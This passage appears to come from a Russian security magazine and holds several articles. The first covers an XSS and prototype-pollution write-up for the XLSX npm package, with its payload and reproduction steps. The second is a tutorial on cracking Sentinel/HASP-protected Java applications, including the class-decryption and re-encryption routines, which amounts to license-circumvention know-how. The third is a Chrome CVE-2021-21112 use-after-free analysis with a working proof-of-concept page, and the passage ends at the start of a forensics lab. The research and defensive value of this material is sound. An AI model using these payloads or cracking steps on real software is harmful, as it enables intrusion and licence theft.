SolidLab. Такого атрибута нет в стандартной структуре файлов формата
XLSX.
   Важный момент: для эксплуатации этого бага не требуется загружать фай‐
лы с комментариями. Если загрязнение прототипа уже произошло, то дос‐
таточно, чтобы имелась функция добавления комментариев.
  В совокупности с багом, который мы обсуждали в первой части статьи,
это приводит к изменению структуры XML-файла во всех следующих обра‐
батываемых файлах XLSX.
   Изменение структуры XML может привести к различным проблемам, таким
как:
 • нарушение формата файла. Изменение структуры XML может дать
   неверный формат XLSX  и,  соответственно, ошибки при попытке его
   открыть или обработать;
 • потеря данных. Изменение структуры XML может привести к потере
   или некорректному отображению данных в файле XLSX. Можно потерять
   данные в таблице;
 • несоответствие  ожидаемому  поведению.  Если   приложение,
   использующее файлы XLSX, полагается на определенную структуру XML,
   то  изменение  этой  структуры может  привести  к  непредсказуемому
   поведению приложения. Как следствие — ошибки, некорректные вычис‐
   ления или другие проблемы.


Реакция разработчиков
Этот недостаток не был исправлен. По мнению разработчиков пакета, баг
не несет серьезных угроз безопасности вне контекста Prototype Pollution.


XSS

Описание недостатка
Последний недостаток, который мы нашли в пакете XLSX, — уязвимость, свя‐
занная с  межсайтовым  скриптингом  (XSS)  в  функции  преобразования
документа в HTML.
  В коде функции make_html_row можно заметить следующую строку:


if(cell.l && (cell.l.Target || "#").charAt(0) != "#") w = '<a href="'
+ cell.l.Target +'">' + w + '</a>';

Вызов cell.l.Target записывается в атрибут href без какой‑либо фильтра‐
ции. Следовательно, из этого вызова можно выйти при загрузке файла. Дос‐
таточно использовать трюк из прошлой части.
   Давай воспроизведем этот баг. Вот серверный код, который будет обра‐
батывать XLSX и отправлять клиенту сгенерированный HTML:


const express = require('express');
const fileUpload = require('express-fileupload');
const app = express();
const XLSX = require("xlsx");


// Middleware для обработки файлов
app.use(fileUpload());


// Принимаем POST-запрос и обрабатываем загружаемый файл
app.post('/process', function(req, res) {
    if (!req.files || Object.keys(req.files).length === 0) {
        return res.status(400).send('Не найдены загруженные файлы.');
    }


  // Получаем загруженный файл
    const uploadedFile = req.files.file;
    let a = XLSX.read(uploadedFile.data);
    console.log(a)
    res.send(XLSX.utils.sheet_to_html(a.Sheets.Sheet1));
});


// Запускаем сервер
app.listen(3000, function() {
    console.log('Сервер запущен на порте 3000');
});

Для демонстрации XSS нужно:
 • создать простой файл Excel и добавить ссылку на внешний ресурс в любую
    ячейку;
 • распаковать файл Excel, чтобы иметь возможность редактировать его
   содержимое;
 • в файле ./xl/worksheets/_rels/sheet1.xml.rels изменить  атрибут
   Target на следующее значение:


   Target='https://solidlab.ru/"><script>alert("Hello from SolidLab")
   </script>'

 • запаковать файл обратно в формат XLSX;
 • отправить запрос с измененным файлом на сервер, который обрабаты‐
   вает файлы XLSX.

При выполнении этих шагов ты увидишь, что инъекция XSS будет выполнена
при открытии файла.





Реакция разработчиков
Разработчики постарались устранить эту уязвимость в версии пакета XLSX
0.19.3.  Теперь  данные  из  Target  проходят  фильтрацию  в  функции
escapehtml:


if(cell.l && (cell.l.Target || "#").charAt(0) != "#") w = '<a href="'
+ escapehtml(cell.l.Target) +'">' + w + '</a>';

CVE этому багу не присвоили.


ВЫВОДЫ

Итак, мы подробно рассмотрели ряд уязвимостей в пакете XLSX. Тут тебе
и ограниченное загрязнение прототипа, и уязвимость межсайтового скрип‐
тинга (XSS).
   Если ты в своей программе используешь XLSX, это может привести к ряду
рисков:
 • при чтении недоверенных файлов XLSX возможна кража или модификация
   данных, кража чужих данных и увеличение нагрузки на сервер;
 • при преобразовании недоверенных файлов XLSX в HTML (или принятия
   данных ячейки из недоверенных источников) возможна эксплуатация меж‐
   сайтового скриптинга и кража данных пользователей.


РЕКОМЕНДАЦИИ

Чтобы не сталкиваться с описанной проблемой, я рекомендую следующее:
 1. Обновление ПО. Настоятельно советую обновить пакет XLSX до вер‐
   сии 0.19.3 или более поздней, где эти уязвимости уже устранены.
 2. Валидация входных данных. Нужно уделить особое внимание валида‐
   ции всех входных данных, передаваемых в функции XLSX. Это сделает при‐
   ложение в целом намного безопаснее.
 3. Профилактика Prototype Pollution. Для предотвращения Prototype
   Pollution следует избегать прямого использования пользовательских вход‐
   ных данных в качестве ключей объекта. Если это неизбежно, рассмотри
   возможность применить механизм защиты, такой как фильтрация ключей
   или блокирование доступа к прототипам.
 4. Использование механизмов безопасности. По возможности при‐
   меняй Content Security Policy для дополнительной защиты от XSS-атак.

Надеюсь, этот текст поможет тебе защитить свое приложение или успешно
попентестить чужое, чтобы выдать эти рекомендации ответственным за раз‐
работку.
ВЗЛОМ

В ОБХОД
СТРАЖИ

КАК ВСКРЫВАЮТ
ПРИЛОЖЕНИЯ,
ЗАЩИЩЕННЫЕ
АППАРАТНЫМ
КЛЮЧОМ SENTINEL





Реверс‑инжиниринг  написанных  на  Java
приложений, если разработчики не позабо‐
тились  заранее об  их  защите,  обычно
не представляет трудностей. Именно чтобы
усложнить жизнь хакерам и  исследова‐           МВК
телям, используются различные инструмен‐
ты, один из которых — защита с аппарат‐
ным ключом Sentinel. Сегодня мы рассмот‐
рим способ обхода такой защиты.


Тем, кто читал мои предыдущие статьи, посвященные защите приложений
на Java, известно самое слабое место такой защиты: прозрачность байт‑кода
и невыносимая легкость восстановления его до исходников.
   Поэтому разработчики таких инструментов стремятся как можно хитрее
спрятать код от любопытных глаз хакеров, используя различные приемы:
обфускацию, компиляцию в натив, шифрование. Наглядный пример пос‐
леднего мы начали разбирать в статье «Беззащитная Java. Ломаем Java
bytecode encryption». Тогда мы остановились на инлайн‑патчинге расшифро‐
ванного байт‑кода прямо из библиотеки агента JVMTI. Сегодня мы продол‐
жим эту тему и научимся патчить непосредственно шифрованный код.
  В  качестве примера мы возьмем  приложение, защищенное  Sentinel
Licensing API Java Class Library — специальной библиотекой защиты Java-
классов, поставляемой к ключам типа Hasp. Почитать о том, как устроена эта
библиотека, можно на сайте разработчика. Само приложение защищено
ключом Hasp, в его рабочем каталоге присутствуют характерные для Sentinel
файлы hasp_rt.exe, hasp_windows_x64_34344.dll, haspvlib_34344.dll
и    специфические   для   Java   HASPJava.dll,   HASPJava_x64.dll,
sntljavaclsrt.dll, sntljavaclsrt_x64.dll. Detect  It Easy предсказуемо
указывает на NetHASP dongle reference и Hardlock dongle reference.





Мы по опыту знаем, что ломать эти библиотеки «в лоб» лучше даже не пытать‐
ся, они весьма сурово виртуализованы и защищены от отладки и модифи‐
кации. Поэтому смотрим на компилированные классы, содержащиеся внутри
JAR. Там тоже все мрачно: кроме главного класса, все остальные пошиф‐
рованы с высокой энтропией, примерно как описано в статье «Беззащитная
Java. Ломаем Java bytecode encryption». За исключением того, что криптор
подключается не как JavaAgent при запуске приложения, а из главного клас‐
са, по сути представляющего собой загрузчик приложения c единственно
открытым кодом:


public static void main(String[] stringArray) {
try {
  String string;
  String string2 = System.getProperty("java.class.path");
  int n = Math.max(string2.lastIndexOf("\"), string2.lastIndexOf("/
"));
  String string3 = string = string2.substring(0, ++n);
  if (JavaClsEntry.isWindows()) {
   string3 = string3 + "sntljavaclsrt";
   if (0 == System.getProperty("sun.arch.data.model").compareTo("64
")) {
     string3 = string3 + "_x64";
   }
     string3 = string3 + ".dll";
  } else if (JavaClsEntry.isLinux()) {
     string3 = string3 + "libsntljavaclsrt_x86_64.so";
  } else {
     return;
  }
  File file = new File(string3);
  string3 = file.getAbsolutePath();
  System.load(string3);
  Class<?> clazz = Class.forName("com.MainApp");
  Method method = clazz.getMethod("main", String[].class);
  method.invoke(null, new Object[]{stringArray});
}
catch (Exception exception) {
  exception.printStackTrace();
}

Загрузчик ничего не делает, кроме как загружает сентинеловскую нативную
библиотеку защиты, а затем главный класс программы. Если ключ не в поряд‐
ке, то главный класс попросту не расшифровывается и приложение рушится
по неправильному формату байт‑кода класса. Собственно, даже такую ошиб‐
ку можно получить только после того, как библиотека выдаст окошко отсутс‐
твия ключа.





Как же нам теперь быть? Ведь, поскольку здесь не происходит прямая под‐
мена JIT-компилятора через JavaAgent, предложенный в упомянутой выше
статье способ не годится. Попробуем подключиться отладчиком непосредс‐
твенно к JIT-компилятору. Немного покурив документацию, обнаруживаем
в библиотеке JVM.DLL такую функцию:


JVM_DefineClassWithSource(JNIEnv *env, const char *name, jobject
loader, const jbyte *buf, jsize len, jobject pd, const char *source)

Как  видно  из  описания,  эта  функция  компилирует  класс  из  массива
байт‑кода. Длина массива, название класса и даже исходного Java-модуля
прилагается. При наличии ключа, установив в нашем любимом отладчике
x64dbg точку останова на вход этой функции, мы получаем в регистре R9 рас‐
шифрованный класс, начиная с сигнатуры CAFEBABE, и его длину в регистре
R14. В итоге его можно легко сдампить на диск следующей командой:


savedata MainApp.class, R9, R14

В некоторых, наиболее простых случаях, когда зашифрован только главный
класс, этого вполне достаточно, чтобы снять защиту целиком, — просто
запаковываем расшифрованный главный класс вместо старого и переопре‐
деляем его в манифесте. Если зашифрованных классов немного, то их тоже
можно сдампить по очереди и бороться с привязкой к ключу уже в расшифро‐
ванных классах. Обычно подобная защита предполагает наличие в модуле
уже  Java-классов Aladdin/Hasp.class, Aladdin/HaspApiVersion.class,
Aladdin/HaspStatus.class и Aladdin/HaspTime.class. Однако зашиф‐
рованных классов может быть очень много, так что дампить их вручную
по очереди непродуктивно.
   Можно, конечно, автоматизировать процесс при помощи костылей — сде‐
лать загрузчик, который подключается к запущенному процессу и сохраняет
классы из памяти по очереди, но это слишком извращенное решение даже
для меня. К тому же мы хоть и ленивые, но достаточно любопытные и нам
интересно докопаться до сути. Для начала — понять, как именно происходит
расшифровка криптованных классов.
  На первый взгляд, задача выглядит жутковато — как я уже говорил, сен‐
тинеловские библиотеки по‑взрослому покриптованы и виртуализированы,
вдобавок сражаются с отладчиком при попытке их трассировки. Но мы
все‑таки попробуем отловить момент расшифровки. Для начала просто прер‐
вемся в отладчике, когда появляется сообщение об отсутствии ключа. По сте‐
ку вызовов мы с удивлением обнаруживаем, что уши проверки ключа в сен‐
тинеловской библиотеке sntljavaclsrt_x64 торчат из кернеловской фун‐
кции чтения файла ReadFile, а еще точнее — из ее низкоуровневого вызова
NtReadFile.





В библиотеке sntljavaclsrt_x64 есть даже соответствующая экспортиру‐
емая функция, подменяющая системную. Проверить это достаточно просто:
установив точку останова на вызов ReadFile из java.dll (выделено на стеке
вызовов на скриншоте), мы обнаруживаем, что ReadFile считывает уже впол‐
не себе расшифрованные блоки байт‑кода порциями по 0x400 байт.
   Таким образом, мы узнали механизм встраивания сентинеловской защиты
в JIT-компилятор Java. Однако на этот раз нам хотелось бы пойти дальше,
чем в предыдущей статье, и выяснить алгоритм шифрования байт‑кода.
Для этого мы сначала ставим точку останова на вызов ReadFile из java.dll.
   Чтобы отфильтровать все побочные чтения из других файлов, установим
фильтр на чтение блоков только размером в 0x400 байт. Для этого в условии
остановки прописываем r8==0x400. По остановке в этой точке адрес буфера
чтения будет находиться в регистре RDX — ставим точку останова на первый
байт этого буфера. Выполнение останавливается, когда в буфер записывают‐
ся зашифрованные данные. Чтение  байта из  этого буфера  тормозится
в  очень  интересном  месте —  мы  видим  обфусцированный  код
sntljavaclsrt_x64:


00007FFC46EB31F5 | movzx ecx,byte ptr ds:[r12+rax]
00007FFC46EB31FA | mov edx,edi
00007FFC46EB31FC | shr edx,18
00007FFC46EB31FF | add edx,ecx
00007FFC46EB3201 | movzx ecx,dl
00007FFC46EB3204 | movzx r11d,byte ptr ds:[r13+rcx]
00007FFC46EB320A | lea rcx,qword ptr ds:[7FFC46EB1A46]
00007FFC46EB3211 | mov edx,ecx
00007FFC46EB3213 | and edx,ebp
00007FFC46EB3215 | xor rcx,rbp
00007FFC46EB3218 | lea rcx,qword ptr ds:[rcx+rdx*2]
00007FFC46EB321C | jmp rcx

В регистре R12 — указатель на зашифрованный буфер, в регистре RDI —
смещение в нем, в регистре R13 — указатель на некую таблицу перекодиров‐
ки.   Результат   этого  фрагмента  кода   хранится  в   регистре  R11.
7FFC46EB1A46 — слегка закодированный адрес следующей инструкции. Нем‐
ного попрыгав по обфусцированному коду, находим следующий фрагмент:


00007FFC46EB32DF | mov ecx,edi
00007FFC46EB32E1 | shr ecx,10
00007FFC46EB32E4 | add ecx,r11d
00007FFC46EB32E7 | movzx ecx,cl
00007FFC46EB32EA | movzx ecx,byte ptr ds:[r13+rcx+100]
00007FFC46EB32F3 | mov edx,edi
00007FFC46EB32F5 | shr edx,8
00007FFC46EB32F8 | add edx,ecx
00007FFC46EB32FA | movzx ecx,dl
00007FFC46EB32FD | movzx edx,byte ptr ds:[r13+rcx+200]
00007FFC46EB3306 | lea rcx,qword ptr ds:[7FFC46EB1A22]
00007FFC46EB330D | mov ebx,ecx
00007FFC46EB330F | and ebx,ebp
00007FFC46EB3311 | xor rcx,rbp
00007FFC46EB3314 | lea rcx,qword ptr ds:[rcx+rbx*2]
00007FFC46EB3318 | jmp rcx

Тут на выходе результат уже в RDX. И наконец, финальный фрагмент, который
представляет собой конец цикла по всем байтам (длина в R9) и условный
переход на начало:


00007FFC46EB3273 | movzx ecx,dl
00007FFC46EB3276 | add ecx,edi
00007FFC46EB3278 | movzx ecx,cl
00007FFC46EB327B | movzx ecx,byte ptr ds:[r13+rcx+300]
00007FFC46EB3284 | mov byte ptr ds:[r12+rax],cl
00007FFC46EB3288 | add edi,1
00007FFC46EB328B | add rax,1
00007FFC46EB328F | mov ecx,r8d
00007FFC46EB3292 | and ecx,ebp
00007FFC46EB3294 | lea rdx,qword ptr ds:[7FFC46EB1A92]
00007FFC46EB329B | mov ebx,edx
00007FFC46EB329D | and ebx,ebp
00007FFC46EB329F | xor rdx,rbp
00007FFC46EB32A2 | cmp rax,r9
00007FFC46EB32A5 | lea rcx,qword ptr ds:[r10+rcx*2]
00007FFC46EB32A9 | lea rdx,qword ptr ds:[rdx+rbx*2]
00007FFC46EB32AD | cmove rdx,rcx
00007FFC46EB32B1 | jmp rdx

Как видно, несмотря на всю навороченность защиты, алгоритм расшифровки
простой как две копейки. Он представляет собой четыре табличных преобра‐
зования. В переводе на понятный язык программирования он выглядит при‐
мерно так (array — раскодируемый фрагмент, table — таблица):


for (int i=0;i<array.Length;i++)
{
  byte r11 = table[(byte)(array[i] + (i >> 0x18))];
  byte ecx = table[(byte)(r11 + (i >> 0x10))+0x100];
  byte edx = table[(byte)(ecx + (i >> 0x8)) + 0x200];
  array[i] = table[(byte)(edx + i)+0x300];
}

Таблица  перекодировки  размером  0x400  байт,  указатель  на  которую
находится в  регистре R13, прекрасно  дампится на диск из  отладчика
при помощи следующей консольной команды:


savedata table.bin, R13, 0x400

После этого можно писать простенький пакетный раскодировщик для любого
количества классов.
  В заключение рассмотрим совсем уж экзотический случай. Предположим,
у нас есть защищенное подобным протектором приложение и по неким при‐
чинам не нужно его полностью отвязывать от ключа, а надо просто немного
расширить его функции: продлить  триал, повысить редакцию, добавить
опций. А требуемые возможности, как назло, находятся именно в защищен‐
ном классе. В прошлый раз мы выкрутились из такой неприятной ситуации,
на лету поправляя расшифрованный байт‑код непосредственно в библиотеке
защиты. В нынешнем  случае мы имеем  гораздо больше  пространства
для маневра — алгоритм шифрования простой, симметричный и реверсиру‐
емый. Грубо говоря, обратный алгоритм шифрования выглядит примерно так:


for (int i=0;i<array.Length;i++)
{
  byte a=byte(indexOf(&table[0x300],array[i])-i);
  byte b=byte(indexOf(&table[0x200],a)-(i >> 0x8));
  byte c=byte(indexOf(&table[0x100],b)-(i >> 0x10));
  array[i]=byte(indexOf(&table,c)-(i >> 0x18));
}

Это  означает,  что  теперь  нам  не  нужно  извращаться,  конструируя
инлайн‑патч. Имея валидный ключ, мы можем расшифровать нужный класс,
поправить его, например при помощи dirtyJoe (как — я описал в статье «Гряз‐
ный Джо. Взламываем Java-приложения с помощью dirtyJOE»), затем снова
закодировать файл и перепаковать его в JAR-архив.
ВЗЛОМ





      КАК РАБОТАЕТ БАГ USE AFTER
         FREE В ДВИЖКЕ BLINK





В январе 2021 года вышел очередной ре‐
лиз  браузера  Chrome. В  нем  испра‐
вили 16  уязвимостей. Одну из них мы
с тобой сегодня разберем, чтобы понять
механизм возникновения таких багов и спо‐              sploitem                                                                                                              Vulnerability researcher в
собы  эксплуатации, с помощью которых          Secware.ru @sploitem                                                                                           sploitem@gmail.com
злоумышленник может атаковать машину,
оставшуюся без обновлений.


Версия Chrome, о которой пойдет речь, — 87.0.4280.141. А интересующая нас
запатченная уязвимость — CVE-2021-21112. Она касается компонента потоков
компрессии в браузерном движке Blink и работает по принципу use after free.
О баге сообщил исследователь YoungJoo Lee (@ashuu_lee) из компании
RaonWhiteHat в ноябре 2020 года через сайт bugs.chromium.org, номер отче‐
та 1151298.
   Blink — это браузерный движок, на основе которого работает Chrome.
А потоки сжатия — это те же веб‑потоки (web streams), но для удобства
веб‑разработчиков передающиеся со сжатием. Чтобы не приходилось тянуть
за проектом зависимости типа zlib, создатели Chrome решили интегрировать
форматы сжатия gzip и deflate в движок Blink.
  По сути, это удобная обертка, трансформирующий поток с алгоритмом
трансформации данных по умолчанию (или gzip, или deflate). Трансформиру‐
ющий поток — это объект, содержащий два потока: читаемый (readable)
и записываемый (writable). А между ними находится трансформер, который
применяет заданный алгоритм к проходящим между ними данным.
  В статье я буду ссылаться на старые версии спецификации потоков
и исходного кода. По понятным причинам исходный код с тех пор изменился.
Да и спецификация тоже.


СТЕНД

Для воспроизведения уязвимости понадобится стенд, состоящий из вир‐
туальной машины и уязвимой версии Chrome. Готовую виртуальную машину
можно загрузить с сайта osboxes.org. Сайт предоставляет образы виртуаль‐
ных машин как для VirtualBox, так и для VMware.





Я буду использовать образ Xubuntu 20 для  VirtualBox. Читатель волен
выбирать любой дистрибутив. Запускаем машину, обновляемся:


sudo apt update && sudo apt upgrade -y

Теперь нам нужна уязвимая версия браузера.





Уязвимую версию Chrome, скомпилированную с ASan (AddressSanitizer), мож‐
но скачать с googleapis.com. В отчете об уязвимости указано название нуж‐
ной сборки, а именно билд asan-linux-release-812852. Распаковываем архив:


unzip asan-linux-release-812852.zip

Готовый билд сэкономит кучу времени, так как сборка браузера требует вре‐
мени, особенно если машина не очень мощная.
   AddressSanitizer — это детектор ошибок памяти. Он предоставляет инстру‐
ментацию во время компиляции кода и библиотеку времени выполнения
(runtime). Подробнее о нем можно почитать на сайте Clang.
   Теперь у нас готова виртуальная машина и скачан необходимый билд
Chrome. Помимо них, нам понадобится Python 3 и LLVM. Обычно лог санитай‐
зера ASan выглядит нечитаемо, поскольку там указаны только адреса и сме‐
щения. Разобраться поможет утилита llvm-symbolizer, которая устанавлива‐
ется вместе с LLVM. Она читает эти адреса и смещения и выводит соответс‐
твующие места в исходном коде. Лог ASan будет выглядеть намного понят‐
нее.
   Ну а Python поможет нам готовить данные для сжатия.





Все установлено, теперь в бой!


ТЕОРИЯ

Прежде чем разбираться в деталях уязвимости, нам нужно немного понимать
предметную область.
   Предыстория всего этого такова. В конце 2019 года команда разработ‐
чиков Chromium реализовала новый JavaScript  API, который называется
Compression Streams. Детали реализации приведены в отчете.
   Этот API основан на спецификации потоков (спецификация от 30 янва‐
ря 2020 года). Подробно с его концепцией можешь ознакомиться в ди‐
зайн‑документе, дополнительные пояснения смотри на GitHub.
  Я привожу более старые версии, так как уязвимость касалась именно их
реализации. В  дальнейшем  спецификация  потоков  и  их  реализация
в Chromium изменилась.
   Теперь разберемся в потоках преобразования, потоках сжатия, объектах
promise и методе postMessage.


Потоки сжатия
Потоки сжатия основаны на концепции и реализации веб‑потоков. Отличие
в том, что потоки компрессии могут сжимать и распаковывать данные.
На выбор — алгоритмы gzip и deflate, широко применяемые в веб‑технологи‐
ях. Потоки компрессии удовлетворяют спецификации transform stream.





Ниже приведена схема алгоритма.





Грубо говоря, если данные не кончились (считан чанк), то вызывается метод
Transform, а тот вызовет метод компрессии или декомпрессии — в данном
случае Inflate. В этом методе данные обрабатываются в цикле. Затем они
помещаются в очередь потока. Для этого вызывается метод Enqueue.
   То есть обрабатываем куски данных и кладем их в очередь.


Promise
JavaScript часто описывают как язык прототипного наследования. Каждый
объект имеет объект‑прототип — шаблон методов и свойств. Все объекты
имеют общий прототип Object.prototype и свой отдельный.
   Поэтому при изменении каких‑то свойств или методов прототипа новые
объекты будут обладать измененными свойствами или методами.
   Далее нас интересуют асинхронное программирование и «обещания»
(promise). Раньше JavaScript исполнялся синхронно, но это мешало веб‑стра‐
ницам быстро загружаться и плавно работать. Асинхронное программирова‐
ние позволяет обойти эту проблему. При ожидании какой‑то операции (заг‐
рузки данных по сети, чтения с диска и тому подобных) основной поток при‐
ложения не блокируется, и оно не подвисает.
   Сначала в JavaScript внедрили асинхронные колбэки (вызовы функций
по завершении операции). Позднее придумали новый стиль написания асин‐
хронного кода — «обещания». Promise — это объект, представляющий асин‐
хронную операцию, выполненную удачно или неудачно. На картинке это наг‐
лядно изображено.





                          Источник — javascript.ru

Промис — это как бы промежуточное состояние: «Я обещаю вернуться к вам
с результатом как можно скорее».
   У объекта promise есть метод then. Он принимает два параметра: фун‐
кции, которые нужно вызвать в случае разрешения (resolve) или в случае
отклонения (reject). В зависимости от результата будет вызвана соответству‐
ющая.
   Особенность JavaScript в том, что в этом языке все является объектом.
По сути метод или функция — это тоже объект. И доступ к нему — это вызов
объектов get и set объекта — прототипа объекта. Красиво?
   Особенность объекта promise в том, что при его разрешении (resolve)
необходимо вызвать then. Доступ к этому методу  (get) можно изменить
на пользовательский код, сменив общий для всех объектов прототип:


Object.defineProperty(Object.prototype, "then", {
        get() {
            console.log("then getter executed");
        }
});


postMessage
Как мы можем узнать из MDN Web Docs, этот метод позволяет обмениваться
данными между объектами типа Window, например между страницей и фрей‐
мом. Интересная особенность заключается в том, как передаются данные.


postMessage(message, targetOrigin, transfer);

После вызова функции владение transfer передается  адресату, а на
передающей стороне прекращается.
   Если вкратце, суть уязвимости в том, что обработка большого массива
данных происходит в цикле и при добавлении обработанных чанков в очередь
есть возможность вызвать пользовательский код на JS. Это обеспечено тем,
что объекту promise дано разрешение на чтение из потока. Пользовательский
код через postMessage может освободить данные, которые на тот момент
обрабатывались в цикле.
  Для более детального понимания всех концепций можно обратиться
к спецификации. Мы же переходим к практике.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ЖИДКИЙ ХРОМ
          КАК РАБОТАЕТ БАГ USE AFTER FREE В ДВИЖКЕ
                                              BLINK





ЗАПУСК POC

Первым делом нужно установить LLVM, так как с ним поставляется сим‐
болизатор. Без него стек вызовов будет выглядеть непонятно, поскольку
не будет названий методов и имен файлов.
   Скачанный билд распаковываем в виртуалке и запускаем. Смотрим, чтобы
версия совпадала со скриншотом.





Теперь создадим файл randomfile.py и запустим его:


python3 randomfile.py

Этим мы создадим данные, которые будет считывать поток сжатия (deflate).


with open('/dev/urandom', 'rb') as f:
  random = f.read(0x40000)
with open('./random', 'wb') as f:
  f.write(random)





Далее создаем файл poc.html и записываем в него следующее:


<html>
<title>Secware.ru</title>


<script>
let ab;
async function main() {
await fetch("random").then(x => x.body.getReader().read().then(y =>
ab = y.value.buffer));
Object.defineProperty(Object.prototype, "then", {
 get() {
   var ab2 = new ArrayBuffer(0);
   try {
     postMessage("", "Secware", [ab]);
   } catch (e) {
     console.log("free");
   }
 }
});
  var input = new Uint8Array(ab);
  console.log(ab.length);
  const cs = new CompressionStream('deflate');
  const writer = cs.writable.getWriter();
  writer.write(input);
  writer.close();
  const output = [];
  const reader = cs.readable.getReader();
  console.log(reader);
  var { value, done } = await reader.read();
}
main();
</script>


<body>
<h2>Welcome to Secware pwn page!</h2>
</body>


</html>

Теперь нужно открыть новый терминал и запустить веб‑сервер из папки
с файлами poc.html и random.


python3 -m http.server





Перед запуском Chromium следует установить опции ASan.


export ASAN_OPTIONS=symbolize= 1

Далее запускаем уязвимый билд и указываем ему, куда подключиться. Заодно
укажем флаги запуска без песочницы и использования GPU.


asan-linux-release-812852/chrome --no-sandbox --disable-gpu http://
127.0.0.1:8000/poc.html

Вкладка браузера должна упасть.





В консоли можно увидеть лог санитайзера адресов ASan.





На рисунке ниже приведен стек вызовов до метода Transform на сайте
исходного кода Chromium. Но в ветке main (на момент написания статьи
2ff0ac6), так как в старых коммитах не работают референсы и сложно отыс‐
кать граф вызовов нужных методов.





Схематически граф вызовов выглядит так.





Метод Transform вызывает Deflate (в случае сжатия), где и происходит use
after free, на строке 117 файла deflate_transformer.cc. По факту доступ к осво‐
божденному массиву происходит в коде zlib, но мы туда не полезем.





Также в логе  видно, что освобождение памяти  происходит из метода
postMessage.





АНАЛИЗ POC

Посмотрим код, который триггерит уязвимость. Сначала вызывается функция
fetch и подгружается наш файл random. Буфер с данными присваивается
переменной ab.


await fetch("random").then(x => x.body.getReader().read().then(y=>ab=
y.value.buffer));

Затем переопределяется аксессор свойства then. Здесь как раз прописан
код, который освобождает память через вызов postMessage. Массив ab
будет освобожден (параметр transfer).


Object.defineProperty(Object.prototype, "then", {
  get() {
    var ab2 = new ArrayBuffer(0);
    try {
      postMessage("", "Secware", [ab]);
    } catch (e) {
      console.log("free");
    }
  }
});

В остальной части кода создается поток сжатия, ему передаются данные
из нашего файла random и через читателя (reader) создается запрос на чте‐
ние (read_request).


var input = new Uint8Array(ab);
console.log(ab.length);
const cs = new CompressionStream('deflate');
const writer = cs.writable.getWriter();
writer.write(input);
writer.close();
const output = [];
const reader = cs.readable.getReader();
console.log(reader);
var { value, done } = await reader.read();

Как раз этот запрос на чтение и спровоцирует освобождение памяти. Как?
Если вкратце, то вызов контроллера enqueue трансформирующего потока
приводит к вызову пользовательского кода. Это как раз код, который акти‐
вирует postMessage и освобождает массив ab.
   Упрощенно схема выглядит вот так.





АНАЛИЗ ИСХОДНОГО КОДА

Схематически цепочка вызовов от Deflate до пользовательского кода на JS
будет такой, как на схеме ниже.





Теперь, зная общую картину, пройдемся по исходному коду. Вот как выглядит
метод сжатия Deflate. В цикле do-while данные читаются, сжимаются (deflate),
а потом помещаются в очередь потока (controller->enqueue()).





Функция  cpp   controller->enqueue()  приведет  нас  в  метод  cpp
TransformStreamDefaultController::Enqueue. Для краткости я пропустил
пару посредников между ними.





Здесь вызывается метод с таким же названием, но из класса контроллера
readable-потока (ReadableStreamDefaultController).





Здесь происходит проверка наличия запросов на чтение. А мы как раз оста‐
вили один такой запрос при помощи такого кода:


javascript var { value, done } = await reader.read();

А   раз  он   есть,   будет   вызван   метод  cpp   ReadableStream::
FulFillReadRequest.
   Тот в свою очередь вызовет Resolve для promise, то есть запрос на чтение.





По спецификации ECMAScript разрешение promise обязательно должно зай‐
ти в свойство then. А поскольку мы поменяли геттер then через Object.
prototype, то при доступе к then вызовется наш код. Он освободит массив,
который в данный момент обрабатывает цикл метода Deflate.
  А значит, код попытается получить доступ к освобожденной памяти.





Так и работает уязвимость. Остальное сводится к эксплуатации уязвимостей
типа use after free. Но это уже отдельная тема, требующая отдельной объ‐
емной статьи.


        WWW

                           •Exploiting a textbook use-after-free in Chrome
                         •Cleanly Escaping the Chrome Sandbox
                   •My Take on Chrome Sandbox Escape  Exploit
                          Chain



ПАТЧ

Теперь посмотрим, как же пофиксили данную уязвимость разработчики
Chromium. В описании патча говорится следующее:


       Correctly handle detach during (de)compression
        Sometimes CompressionStream and DecompressionStream enqueue«
       multiple output chunks  for a  single input chunk. When  this happens,
       JavaScript code can  detach  the  input  ArrayBuffer  while  the stream
         is processing it. This will cause an error when zlib tries to read the buffer
       again afterwards. To prevent  this, buffer output chunks  until the entire
       input chunk has been processed, and then enqueue them all at once.                »
По сути, для компрессии и декомпрессии теперь используется временный
массив buffers.





Только после  этого данные передаются в очередь потока через вызов
enqueue. Уже он может вызвать пользовательский код на JS.





Следовательно, во  время работы  цикла  компрессии/декомпрессии уже
невозможно вызвать пользовательский код. Метод enqueue будет вызван
после. То же будет и с кодом атакующего, но данные уже обработаны и дос‐
тупа к освобожденной памяти не будет.


ВЫВОДЫ

В заключение хочу сказать, что уязвимость явно была вдохновлена предыду‐
щими подобными багами. Отчеты Сергея Глазунова номер 2001 от 27 янва‐
ря 2020 года и номер 2005 от 30 января 2020 года касались этого же ком‐
понента. Уязвимости триггерились похожим методом и были связаны с раз‐
решением  promise. В текущей  версии  спецификации  потоков и  кода
Chromium такая возможность отсутствует.
ВЗЛОМ



  УРОКИ
ФОРЕНЗИКИ

       ИЗВЛЕКАЕМ АРТЕФАКТЫ
      ИЗ ДАМПА ПАМЯТИ СЕРВЕРА





Когда злоумышленники атакуют сеть пред‐
приятия, у специалистов по информацион‐
ной безопасности зачастую остается не так
уж и много материала для исследований —
например, только образ памяти скомпро‐            rayhunt454                                                                                       grigadan454@gmail.com
метированного сервера. Подобную  ситу‐
ацию  описывает задание  BSidesJeddah-
Part2 с ресурса CyberDefenders, которое мы
сегодня разберем.


Наша задача — выявить причины взлома сервиса, развернутого на Oracle
WebLogic Server, и научиться извлекать основные артефакты из образа опе‐
ративной памяти Windows.
  По сценарию устройство мониторинга сетевой безопасности зафик‐
сировало подозрительный трафик, исходящий от одного из веб‑серверов
организации. Мы должны проанализировать образ памяти сервера и восста‐
новить картину взлома информационного ресурса.


ИСПОЛЬЗУЕМЫЕ УТИЛИТЫ

 1. Volatility Framework 2.6.1 — инструмент, реализованный на Python вер‐
   сии 2 и предназначенный для извлечения артефактов из образов энер‐
   гозависимой памяти.
 2. Volatility 3 — обновленный инструмент для извлечения артефактов, раз‐
   работанный на Python 3.

Загрузим файл архива с артефактами, извлечем из него файл memory.mem
(SHA256:5b3b1e1c92ddb1c128eca0fa8c917c16c275ad4c95b19915a288a745f99
60f39) и приступим к исследованию.


ИССЛЕДОВАНИЕ ОБРАЗА ПАМЯТИ

При работе с этим образом мы будем пользоваться фреймворком Volatility
версий 2 и 3. Их основное различие описано в документации. Удобство
